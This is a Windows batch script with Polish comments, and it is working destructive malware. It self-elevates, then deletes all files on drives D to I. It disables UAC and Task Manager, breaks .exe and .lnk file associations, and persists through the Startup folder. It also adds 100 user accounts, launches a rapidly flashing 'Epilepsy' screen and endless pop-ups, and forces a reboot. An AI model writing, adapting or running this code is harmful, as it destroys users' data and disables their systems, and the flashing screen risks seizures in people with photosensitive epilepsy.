@echo off
:: SPRAWDZENIE ADMINA
net session >nul 2>&1 || (powershell start -verb runas '%~0' & exit /b)

:: TWORZENIE FOLDERU
if not exist "C:\batch" mkdir "C:\batch"
cd /d "C:\batch"

:: 1. ERROR MSG (VBS)
echo x=msgbox("Your pc has been HACKED", 16, "Error") > "C:\batch\error.vbs"

:: 2. EPILEPSY (Poprawiona składnia z daszkami ^)
(
echo @echo off
echo title CHIPS EATER
echo :x
echo color 0a ^^& echo Computer eaten by Chips.
echo color b0 ^^& echo Computer eaten by Chips.
echo color 4f ^^& echo Computer eaten by Chips.
echo color e1 ^^& echo Computer eaten by Chips.
echo color d5 ^^& echo Computer eaten by Chips.
echo goto x
) > "C:\batch\Epilepsy.bat"

:: 3. DISKKILLER (Poprawiona pętla)
(
echo @echo off
echo for %%%%d in (D E F G H I) do (
echo   if exist %%%%d:\ (
echo     del /s /q /f %%%%d:\*.* ^>nul 2^>^&1
echo     for /l %%%%i in (1,1,500) do md "%%%%d:\CHIPS_%%%%i"
echo   )
echo )
) > "C:\batch\DiskKiller.bat"

:: 4. PAYLOAD (Główny mózg po resecie)
(
echo @echo off
echo taskkill /f /im explorer.exe
echo powershell Set-WinUserLanguageList -LanguageList ar-SA -Force
echo assoc .exe=txtfile
echo assoc .lnk=txtfile
echo start /max C:\batch\Epilepsy.bat
echo start /min C:\batch\DiskKiller.bat
echo :LOOP
echo md "C:\Users\%%username%%\Desktop\CHIPS_%%random%%"
echo echo x=msgbox("Chips", 0, "Chips") ^^> "C:\batch\msg.vbs"
echo start C:\batch\msg.vbs
echo start calc.exe ^^& start notepad.exe
echo timeout /t 5 ^^>nul
echo goto LOOP
) > "C:\batch\Payload.bat"

:: --- REJESTR I UŻYTKOWNICY ---
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul

:: AUTOSTART
copy "C:\batch\Payload.bat" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Chips.bat" /y >nul

:: 100 USERÓW
for /l %%x in (1, 1, 100) do net user Chips%%x Chips /add >nul

:: START
start C:\batch\error.vbs
shutdown -r -t 10 -c "PC HACKED."
exit
